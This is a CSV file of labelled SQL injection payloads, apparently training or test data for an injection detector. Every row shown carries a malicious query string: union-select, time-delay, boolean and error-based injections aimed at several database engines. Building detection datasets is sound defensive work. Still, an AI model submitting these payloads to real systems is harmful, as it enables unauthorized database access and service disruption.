row_index,payload_norm,label,sqli_type_hint
9810,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
9811,1 ) ) as gocb where 4335 = 4335,1,
9812,"1%' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
9813,"1"" ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
9814,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'yvbb' = 'yvbb",1,
9815,"1"" and 7533 = 7533",1,
9816,"1 ) union all select null,null,null,null,null,null,null,null#",1,
9817,"1' ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( 'weof' = 'weof",1,
9818,1'+ ( select 'uetb' where 6468 = 6468,1,
9819,"1'+ ( select lhho where 7579 = 7579 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
9820,"1 where 1886 = 1886 union all select null,null,null,null,null,null,null,null,null--",1,
9821,"-1844"" where 7948 = 7948 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
9822,"1"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9823,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'btnl' = 'btnl",1,
9824,"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",1,
9825,"1"" ) where 6859 = 6859 union all select null,null,null,null,null,null,null,null#",1,
9826,"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1,
9827,"select * from generate_series ( 2382,2382,case when ( 2382 = 4352 ) then 1 else 0 end ) limit 1--",1,
9828,"1"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
9829,select sleep ( 5 ) and ( ( ( 'thqr' like 'thqr,1,
9830,"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1,
9831,"1 ) ) ) union all select null,null,null,null--",1,
9832,"-9565"" where 1616 = 1616 union all select 1616,1616,1616,1616--",1,
9833,"1"" ) union all select null,null,null,null,null,null,null--",1,
9834,"1%"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""%"" = """,1,
9835,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""gddl"" like ""gddl",1,
9836,"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9837,"1 ) as fgqe where 1526 = 1526 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
9838,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'wesl' = 'wesl",1,
9839,"1' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'bfrq' like 'bfrq",1,
